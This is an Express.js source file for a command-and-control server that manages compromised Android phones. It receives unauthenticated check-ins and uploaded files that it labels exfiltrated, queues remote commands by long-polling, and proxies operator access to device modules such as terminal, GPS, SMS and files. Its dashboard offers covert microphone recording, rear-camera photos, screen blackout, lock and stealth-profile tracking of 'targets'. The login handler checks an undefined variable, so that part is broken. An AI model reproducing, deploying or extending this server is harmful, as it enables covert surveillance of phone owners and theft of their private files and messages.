const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;
let currentC2Password = process.env.C2_PASSWORD || 'admin1337';

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/c2', express.static(path.join(__dirname, 'c2')));

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}
app.use('/c2/downloads', express.static(UPLOADS_DIR));

const devices = new Map();
const commandQueues = new Map();
const pendingResponses = new Map();
const longPollWaiters = new Map(); // deviceId -> Array of res objects
const exfiltratedFiles = [];

const DATA_FILE = path.join(__dirname, 'devices.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            const json = JSON.parse(raw);
            if (json.devices && Array.isArray(json.devices)) {
                json.devices.forEach(d => {
                    if (d && (d.deviceId || d.model || d.brand)) {
                        const id = d.deviceId || d.brand || d.model;
                        devices.set(id, d);
                    }
                });
            }
            if (json.uploads && Array.isArray(json.uploads)) {
                exfiltratedFiles.push(...json.uploads);
            }
        }
    } catch (e) {}
}

function saveData() {
    try {
        const data = {
            devices: Array.from(devices.values()),
            uploads: exfiltratedFiles.slice(0, 200)
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch (e) {}
}

loadData();

function syncUploadsDirectory() {
    try {
        if (!fs.existsSync(UPLOADS_DIR)) return;
        const filesOnDisk = fs.readdirSync(UPLOADS_DIR);
        filesOnDisk.forEach(filename => {
            if (filename.startsWith('.')) return;
            const exists = exfiltratedFiles.some(f => f.filename === filename);
            if (!exists) {
                const filePath = path.join(UPLOADS_DIR, filename);
                const stats = fs.statSync(filePath);

                let origName = filename;
                const match = filename.match(/^\d+_(.+)$/);
                if (match) origName = match[1];

                exfiltratedFiles.unshift({
                    id: Math.random().toString(36).substring(7),
                    filename: filename,
                    originalName: origName,
                    deviceId: 'Exfiltrated_Payload',
                    size: stats.size,
                    timestamp: stats.mtime.toISOString()
                });
            }
        });
    } catch (e) {}
}

syncUploadsDirectory();

function formatTime(isoString) {
    try {
        return new Date(isoString || Date.now()).toLocaleString('en-US', {
            timeZone: 'America/Toronto', hour12: true
        });
    } catch (e) {
        return new Date(isoString || Date.now()).toLocaleString();
    }
}

function formatFileSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

let lastActiveDeviceId = null;

function getCookie(cookieHeader, name) {
    if (!cookieHeader) return null;
    const matches = cookieHeader.match(new RegExp('(?:^|; )' + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)'));
    return matches ? decodeURIComponent(matches[1]) : null;
}

function isAuthenticated(req) {
    const token = getCookie(req.headers.cookie, 'c2_auth_token');
    return token === 'AUTH_OK_1337';
}

function dispatchCommand(deviceId, cmd) {
    let waiters = longPollWaiters.get(deviceId) || [];
    while (waiters.length > 0) {
        let res = waiters.shift();
        if (!res.headersSent) {
            res.json(cmd);
            return true;
        }
    }
    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
    commandQueues.get(deviceId).push(cmd);
    return false;
}

// LOGIN HTML PAGE
function serveLoginPage(req, res, errorMsg = '') {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>LAB-RATS | C2 LOGIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%), linear-gradient(rgba(0,242,255,.02) 1px, transparent 1px), linear-gradient(90deg, rgba(0,242,255,.02) 1px, transparent 1px); color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }
        .login-card { background: rgba(15,15,25,0.75); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); border: 1px solid #00f2ff; padding: 35px 25px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.2); width: 100%; max-width: 450px; position: relative; }
        .title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.6rem; letter-spacing: 3px; margin-bottom: 20px; color: #00f2ff; line-height: 1.2; text-transform: uppercase; }
        input[type=password] { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 14px; margin-bottom: 20px; width: 100%; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }
        input[type=password]:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.3); }
        button { background: rgba(0,242,255,0.1); border: 1px solid #00f2ff; color: #00f2ff; padding: 14px 28px; width: 100%; border-radius: 8px; font-weight: 900; font-family: 'Orbitron', sans-serif; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: 0.3s; }
        button:hover { background: #00f2ff; color: #000; box-shadow: 0 0 30px #00f2ff; }
        .error-msg { color: #ff3131; font-size: 0.75rem; margin-bottom: 15px; font-weight: bold; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="/c2/header_dashboard.png" style="width: 80%; max-width: 320px; height: auto; margin: 0 auto 20px auto; display: block;" alt="LAB-RATS">
        <div class="title-font">C2 OPERATOR AUTH</div>
        ${errorMsg ? `<div class="error-msg">${errorMsg}</div>` : ''}
        <form action="/login" method="POST">
            <input type="password" name="password" placeholder="ENTER C2 PASSCODE" required autofocus>
            <button type="submit">AUTHENTICATE</button>
        </form>
    </div>
</body>
</html>`;
    res.send(html);
}

// LOGIN HANDLER
app.post('/login', (req, res) => {
    const { password } = req.body || {};
    if (password === C2_PASSWORD) {
        res.setHeader('Set-Cookie', 'c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax');
        return res.redirect('/');
    }
    return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
});

// Ingestion Handler for device check-ins
function handleCheckin(req, res) {
    try {
        const contentType = req.headers['content-type'] || '';
        if (contentType.includes('multipart/form-data')) {
            return handleFileUpload(req, res);
        }

        const payload = req.body || {};
        const query = req.query || {};
        const data = { ...query, ...payload };

        const brand = data.brand || data.manufacturer || 'Android';
        const model = data.model || data.device || 'Device';
        const deviceId = data.deviceId || data.model || data.device || brand || 'Android Target';

        const existing = devices.get(deviceId);
        const alias = (existing && existing.alias) ? existing.alias : (data.alias || '');

        const entry = {
            deviceId,
            brand,
            model,
            alias,
            os: data.os || 'Android 16',
            battery: data.battery || '100%',
            ip: data.ip || req.ip || '127.0.0.1',
            port: data.port || 9191,
            stealth: !!data.stealth,
            lastSeen: new Date().toISOString(),
            ...data
        };

        devices.set(deviceId, entry);
        saveData();

        console.log(`[CHECKIN SUCCESS] DeviceId: ${deviceId} | Alias: "${alias}" | Brand: ${brand} | Model: ${model} | IP: ${entry.ip}`);
        res.json({ success: true, message: 'Check-in recorded' });
    } catch (err) {
        res.status(400).json({ success: false, error: err.message });
    }
}

// File Upload / Exfiltration Handler
function handleFileUpload(req, res) {
    try {
        const contentType = req.headers['content-type'] || '';
        const deviceId = req.headers['x-device-id'] || req.query.deviceId || 'Unknown_Target';

        if (!contentType.includes('multipart/form-data')) {
            return res.status(400).json({ success: false, error: 'Expected multipart/form-data' });
        }

        const boundary = contentType.split('boundary=')[1];
        if (!boundary) {
            return res.status(400).json({ success: false, error: 'No boundary found' });
        }

        let bodyBuffer = [];
        req.on('data', chunk => bodyBuffer.push(chunk));
        req.on('end', () => {
            try {
                const buffer = Buffer.concat(bodyBuffer);
                const boundaryStr = '--' + boundary;
                const parts = buffer.toString('binary').split(boundaryStr);

                let savedFile = null;

                for (let part of parts) {
                    if (part.includes('filename="')) {
                        const filenameMatch = part.match(/filename="([^"]+)"/);
                        const filename = filenameMatch ? filenameMatch[1] : `exfil_${Date.now()}.dat`;

                        const headerEnd = part.indexOf('\r\n\r\n');
                        if (headerEnd !== -1) {
                            let fileDataBinary = part.substring(headerEnd + 4);
                            if (fileDataBinary.endsWith('\r\n')) {
                                fileDataBinary = fileDataBinary.substring(0, fileDataBinary.length - 2);
                            }

                            const safeFilename = `${Date.now()}_${filename.replace(/[^a-zA-Z0-9_\.-]/g, '_')}`;
                            const filePath = path.join(UPLOADS_DIR, safeFilename);

                            fs.writeFileSync(filePath, Buffer.from(fileDataBinary, 'binary'));

                            const fileEntry = {
                                id: Math.random().toString(36).substring(7),
                                filename: safeFilename,
                                originalName: filename,
                                deviceId,
                                size: Buffer.byteLength(fileDataBinary, 'binary'),
                                timestamp: new Date().toISOString()
                            };

                            exfiltratedFiles.unshift(fileEntry);
                            saveData();
                            savedFile = fileEntry;

                            console.log(`[EXFIL SUCCESS] Saved ${filename} (${fileEntry.size} bytes) from device ${deviceId}`);
                        }
                    }
                }

                if (savedFile) {
                    res.json({ success: true, message: 'File ingested into Data Vault', file: savedFile });
                } else {
                    res.status(400).json({ success: false, error: 'No file found in multipart payload' });
                }
            } catch (err) {
                console.error('[EXFIL ERROR]', err.message);
                res.status(500).json({ success: false, error: err.message });
            }
        });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
}

// Unauthenticated Device Check-in & Exfiltration Routes
app.all('/checkin', handleCheckin);
app.all('/checkin/', handleCheckin);
app.all('/api/checkin', handleCheckin);
app.all('/api/checkin/', handleCheckin);
app.post('/checkin', handleCheckin);

app.all('/upload', handleFileUpload);
app.all('/upload/', handleFileUpload);
app.all('/api/upload', handleFileUpload);
app.all('/api/upload/', handleFileUpload);
app.post('/upload', handleFileUpload);

// Device command polling with Instant Long-Polling
function handleTunnelPoll(req, res) {
    const id = req.query.deviceId;
    if (!id) return res.json({});

    if (devices.has(id)) {
        const dev = devices.get(id);
        dev.lastSeen = new Date().toISOString();
    }

    const queue = commandQueues.get(id) || [];
    if (queue.length > 0) {
        return res.json(queue.shift());
    }

    let polls = longPollWaiters.get(id) || [];
    polls.push(res);
    longPollWaiters.set(id, polls);

    req.on('close', () => {
        let list = longPollWaiters.get(id) || [];
        longPollWaiters.set(id, list.filter(r => r !== res));
    });

    setTimeout(() => {
        let list = longPollWaiters.get(id) || [];
        if (list.includes(res)) {
            longPollWaiters.set(id, list.filter(r => r !== res));
            if (!res.headersSent) res.json({});
        }
    }, 10000);
}
app.get('/tunnel-poll', handleTunnelPoll);
app.get('/checkin/tunnel-poll', handleTunnelPoll);

// Device command response
function handleTunnelResponse(req, res) {
    const data = req.body || {};
    const pending = pendingResponses.get(data.id);
    if (pending) {
        pendingResponses.delete(data.id);
        const buf = Buffer.from(data.payload || '', 'base64');
        pending.res.status(data.status || 200);
        if (data.contentType) pending.res.setHeader('Content-Type', data.contentType);
        if (data.setCookie) pending.res.setHeader('Set-Cookie', data.setCookie);
        pending.res.send(buf);
    }
    res.json({ success: true });
}
app.post('/tunnel-response', handleTunnelResponse);
app.post('/checkin/tunnel-response', handleTunnelResponse);

// AUTHENTICATION GUARD MIDDLEWARE FOR OPERATOR ROUTES
app.use((req, res, next) => {
    if (isAuthenticated(req)) {
        return next();
    }
    return serveLoginPage(req, res);
});

// Delete Exfiltrated File Endpoint
app.post('/api/delete-exfil', (req, res) => {
    try {
        const { id } = req.body || {};
        const idx = exfiltratedFiles.findIndex(f => f.id === id);
        if (idx !== -1) {
            const item = exfiltratedFiles[idx];
            const filePath = path.join(UPLOADS_DIR, item.filename);
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
            exfiltratedFiles.splice(idx, 1);
            saveData();
            console.log(`[EXFIL DELETED] Removed file ${item.filename}`);
            return res.json({ success: true });
        }
        res.status(404).json({ success: false, error: 'File not found' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Device Rename / Alias API Endpoint
app.post('/api/rename-device', (req, res) => {
    try {
        const { deviceId, alias } = req.body || {};
        if (deviceId && devices.has(deviceId)) {
            const dev = devices.get(deviceId);
            dev.alias = (alias || '').trim();
            devices.set(deviceId, dev);
            saveData();
            console.log(`[ALIAS UPDATED] Device ${deviceId} renamed to "${dev.alias}"`);
            return res.json({ success: true, alias: dev.alias });
        }
        res.status(400).json({ success: false, error: 'Device not found' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// GET / serves Operator Dashboard HTML or handles GET check-ins
app.get('/', (req, res) => {
    if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
        return handleCheckin(req, res);
    }

    syncUploadsDirectory();

    const deviceList = Array.from(devices.values());
    const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;

    let devicesHtml = deviceList.length === 0 ?
        '<tr><td colspan="9" style="text-align: center; color: #888; padding: 20px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
        deviceList.map(d => {
            const displayName = (d.alias && d.alias.trim()) ? d.alias.trim() : (d.brand || d.deviceId || 'samsung');
            const subName = (d.alias && d.alias.trim()) ? ` (${d.brand || ''})` : '';

            const ageSec = (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000;
            let statusBadge = '';
            if (ageSec < 45) {
                statusBadge = '<span style="color:var(--neon-green); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--neon-green); box-shadow:0 0 6px var(--neon-green);"></span>ONLINE</span>';
            } else if (ageSec < 300) {
                statusBadge = '<span style="color:var(--neon-yellow); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--neon-yellow); box-shadow:0 0 6px var(--neon-yellow);"></span>IDLE</span>';
            } else {
                statusBadge = '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--danger); box-shadow:0 0 6px var(--danger);"></span>OFFLINE</span>';
            }

            return `
            <tr>
                <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
                    <div style="display: inline-flex; align-items: center; gap: 5px; vertical-align: middle;">
                        <span onclick="renameDevice('${d.deviceId}', '${(d.alias || '').replace(/'/g, "\\'")}')" style="cursor:pointer; font-size:0.6rem; opacity:0.75; transition:opacity 0.2s; line-height:1; user-select:none;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.75" title="Rename Target">✏️</span>
                        <span>${displayName}</span><span style="color:#666; font-size:0.68rem;">${subName}</span>
                    </div>
                </td>
                <td style="vertical-align: middle;">${d.model || 'SM-F731W'}</td>
                <td style="vertical-align: middle;">Android ${d.os || '16'}</td>
                <td style="vertical-align: middle;">${d.battery || '100%'}</td>
                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle;">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                <td style="vertical-align: middle;">${statusBadge}</td>
                <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                <td style="vertical-align: middle; white-space: nowrap;">
                    <div style="display: inline-flex; align-items: center; gap: 6px;">
                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
                        <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
                            <option value="" disabled selected>⚡ ACTIONS</option>
                            <option value="mic">🎙️ Record Mic (60s)</option>
                            <option value="flashlight">🔦 Toggle Flashlight</option>
                            <option value="blackout">🕶️ Toggle Blackout</option>
                            <option value="lock">🔒 Toggle Lock</option>
                            <option value="volume">🔊 Max Vol + Vibrate</option>
                            <option value="photo">📷 Quick Photo (Rear)</option>
                        </select>
                    </div>
                </td>
            </tr>
            `;
        }).join('');

    let exfilHtml = exfiltratedFiles.length === 0 ?
        '<tr><td colspan="5" style="text-align: center; color: #888; padding: 20px;">NO EXFILTRATED DATA RECEIVED YET</td></tr>' :
        exfiltratedFiles.map(f => {
            const devObj = devices.get(f.deviceId);
            const devLabel = devObj ? ((devObj.alias && devObj.alias.trim()) ? devObj.alias.trim() : (devObj.brand || f.deviceId)) : f.deviceId;
            return `
            <tr>
                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">${f.originalName}</td>
                <td style="vertical-align: middle; color: #aaa;">${devLabel}</td>
                <td style="vertical-align: middle; font-family: monospace;">${formatFileSize(f.size)}</td>
                <td style="font-size: 0.68rem; color: #aaa; vertical-align: middle;">${formatTime(f.timestamp)}</td>
                <td style="vertical-align: middle; white-space: nowrap;">
                    <div style="display: inline-flex; align-items: center; gap: 6px;">
                        <a href="/c2/downloads/${f.filename}" download="${f.originalName}" style="background: var(--neon-green); color: #000; padding: 5px 12px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">DOWNLOAD</a>
                        <button onclick="deleteExfil('${f.id}')" style="background: rgba(255,49,49,0.15) !important; border: 1px solid var(--danger) !important; color: var(--danger) !important; padding: 5px 12px !important; border-radius: 6px !important; font-weight: bold !important; font-size: 0.65rem !important; cursor: pointer; outline: none; margin: 0 !important; width: auto !important; height: auto !important; display: inline-block !important;">DELETE</button>
                    </div>
                </td>
            </tr>
            `;
        }).join('');

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAB-RATS | C2 COMMAND RELAY</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/c2/style.css">
    <style>
        @media (min-width: 1024px) { body { zoom: 0.9; } }
        .container { max-width: 1400px !important; width: 95% !important; margin: 0 auto !important; }
        .card { padding: 22px !important; overflow: visible !important; width: 100% !important; }
        table { width: 100% !important; border-collapse: separate !important; border-spacing: 0 6px !important; table-layout: auto !important; }
        th { padding: 10px 10px !important; color: var(--neon-cyan) !important; font-family: 'Orbitron', sans-serif !important; font-size: 0.78rem !important; letter-spacing: 1px !important; text-transform: uppercase !important; white-space: nowrap !important; vertical-align: middle !important; }
        td { padding: 10px 10px !important; font-size: 0.78rem !important; white-space: nowrap !important; vertical-align: middle !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header" style="text-align:center; padding:20px 0; margin-bottom:20px;">
            <img src="/c2/header_dashboard.png" style="width: 75%; max-width: 820px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
        </div>

        <div class="card" style="margin-top: 20px; border-left: 3px solid var(--neon-cyan);">
            <h2 style="text-align: center; color: var(--neon-cyan); margin-bottom: 20px;">CONNECTED_TARGETS</h2>
            <div style="width: 100%;">
                <table>
                    <thead>
                        <tr>
                            <th>DEVICE ID</th>
                            <th>MODEL</th>
                            <th>OS VERSION</th>
                            <th>BATTERY</th>
                            <th>ENDPOINT IP</th>
                            <th>STATUS</th>
                            <th>PROFILE</th>
                            <th>LAST CHECK-IN</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${devicesHtml}
                    </tbody>
                </table>
            </div>
            <div style="text-align: center; margin-top: 20px;">
                <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH TARGETS</button>
            </div>
        </div>

        <!-- EXFILTRATED DATA VAULT CARD -->
        <div class="card" style="margin-top: 25px; border-left: 3px solid var(--neon-cyan);">
            <div style="text-align: center; margin-bottom: 20px;">
                <h2 style="margin: 0 auto 5px auto; color: var(--neon-cyan); text-align: center;">EXFILTRATED_DATA_VAULT</h2>
                <span style="font-size: 0.7rem; color: #aaa; display: block; text-align: center;">TOTAL PAYLOADS: <b style="color: var(--neon-green);">${exfiltratedFiles.length}</b></span>
            </div>
            <div style="width: 100%;">
                <table>
                    <thead>
                        <tr>
                            <th>FILE NAME</th>
                            <th>TARGET DEVICE</th>
                            <th>FILE SIZE</th>
                            <th>TIMESTAMP</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${exfilHtml}
                    </tbody>
                </table>
            </div>
            <div style="text-align: center; margin-top: 20px;">
                <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH VAULT</button>
            </div>
        </div>
    </div>
    <script>
    function renameDevice(deviceId, currentAlias) {
        const newName = prompt('Enter custom name/alias for target device:', currentAlias || '');
        if (newName !== null) {
            fetch('/api/rename-device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: deviceId, alias: newName.trim() })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    location.reload();
                } else {
                    alert('Failed to update name: ' + (data.error || 'Unknown error'));
                }
            })
            .catch(err => alert('Network error updating device name.'));
        }
    }

    function dispatchQuickCommand(deviceId, action) {
        if (!action) return;

        let path = '/';
        let label = '';

        if (action === 'mic') {
            path = '/audio/mic/start?duration=60';
            label = 'Record Mic (60s)';
        } else if (action === 'flashlight') {
            path = '/device/flashlight';
            label = 'Toggle Flashlight';
        } else if (action === 'blackout') {
            path = '/ghost/interact?action=blackout';
            label = 'Toggle Blackout';
        } else if (action === 'lock') {
            path = '/ghost/lock';
            label = 'Toggle System Lock';
        } else if (action === 'volume') {
            path = '/device/max-volume';
            label = 'Max Volume & Alarm';
        } else if (action === 'photo') {
            path = '/camera/photo?cam=0';
            label = 'Quick Photo (Rear)';
        }

        const fullUrl = \`/proxy\${path}\${path.includes('?') ? '&' : '?'}deviceId=\${encodeURIComponent(deviceId)}\`;
        fetch(fullUrl)
            .then(r => {
                if (r.ok) {
                    alert(\`[⚡ TACTICAL DISPATCH SUCCESS]\\nCommand "\${label}" dispatched to target.\`);
                } else {
                    alert(\`[!] Dispatch status \${r.status}\`);
                }
            })
            .catch(err => alert('Network error dispatching quick command.'));
    }

    function deleteExfil(id) {
        if (confirm('Permanently delete this exfiltrated payload file from C2 Vault?')) {
            fetch('/api/delete-exfil', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    location.reload();
                } else {
                    alert('Failed to delete file: ' + (data.error || 'Unknown error'));
                }
            })
            .catch(err => alert('Network error deleting file.'));
        }
    }
    </script>
</body>
</html>`;

    res.send(html);
});

// Catch-All Device Proxy Handler (Proxies all module tabs: /terminal, /ghost, /camera, /gps, /files, /sms, etc.)
app.all('*', (req, res) => {
    if (req.path === '/favicon.ico') return res.status(404).end();

    let deviceId = req.query.deviceId || getCookie(req.headers.cookie, 'c2_target_device') || lastActiveDeviceId;

    // Fallback: Pick the most recently active checked-in device
    if (!deviceId && devices.size > 0) {
        let latestDevice = null;
        let latestTime = 0;
        for (const [id, dev] of devices.entries()) {
            const t = new Date(dev.lastSeen || 0).getTime();
            if (t > latestTime) {
                latestTime = t;
                latestDevice = id;
            }
        }
        deviceId = latestDevice || Array.from(devices.keys())[0];
    }

    if (!deviceId) deviceId = 'samsung';

    if (deviceId) {
        lastActiveDeviceId = deviceId;
        res.setHeader('Set-Cookie', `c2_target_device=${encodeURIComponent(deviceId)}; Path=/; SameSite=Lax`);
    }

    if (!devices.has(deviceId)) {
        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
        saveData();
    }

    const requestId = Math.random().toString(36).substring(7);
    let relayPath = req.originalUrl.replace('/proxy', '') || '/';
    if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;

    pendingResponses.set(requestId, { res });

    let requestBody = '';
    const contentType = req.headers['content-type'] || '';
    if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
        if (typeof req.body === 'string') {
            requestBody = req.body;
        } else if (req.body && typeof req.body === 'object') {
            if (contentType.includes('application/json')) {
                requestBody = JSON.stringify(req.body);
            } else {
                requestBody = new URLSearchParams(req.body).toString();
            }
        }
    }

    const cmdObj = {
        type: 'request',
        id: requestId,
        method: req.method,
        path: relayPath,
        cookie: req.headers.cookie || '',
        body: requestBody,
        contentType: contentType || 'application/x-www-form-urlencoded'
    };

    dispatchCommand(deviceId, cmdObj);

    setTimeout(() => {
        if (pendingResponses.has(requestId)) {
            pendingResponses.delete(requestId);
            if (!res.headersSent) res.status(504).send('<!DOCTYPE html><html><body style="background:#02080d;color:#ff3131;font-family:monospace;padding:40px;text-align:center;"><h2>TUNNEL_GATEWAY_TIMEOUT</h2><p>Device is offline or not polling.</p></body></html>');
        }
    }, 25000);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
});
